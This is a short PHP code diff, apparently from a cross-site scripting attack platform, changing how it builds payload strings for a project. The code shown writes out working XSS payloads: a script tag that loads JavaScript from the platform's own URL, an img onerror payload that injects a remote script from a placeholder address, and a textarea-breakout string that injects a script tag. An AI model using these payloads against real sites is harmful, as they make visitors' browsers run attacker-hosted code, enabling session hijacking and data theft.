@@ -230,8 +230,9 @@ case 'viewcode':
     //转短地址
     $longUrl = URL_ROOT . "/" . $project['urlKey'] . "?" . time();
     $longUrl2 = URL_ROOT . "/" . $project['urlKey'] . "?";
-    $shortUrl = LongUrltoShortUrl($longUrl);//短网址1
-    $shortShow1 = StripStr("<script src=" . $shortUrl . "></script>");
+    //$shortUrl = LongUrltoShortUrl($longUrl);//短网址1
+    //$shortShow1 = StripStr("<script src=" . $shortUrl . "></script>");
+    $shortShow1 = $longUrl;
     $shortShow3 = StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='你的js地址';>");
     $scriptShow1 = StripStr("</textarea>'\"><script src=" . $longUrl . "></script>");
     //$scriptShow1=StripStr("</textarea>'\"><script src=".URL_ROOT."/{$project[urlKey]}?".time()."></s
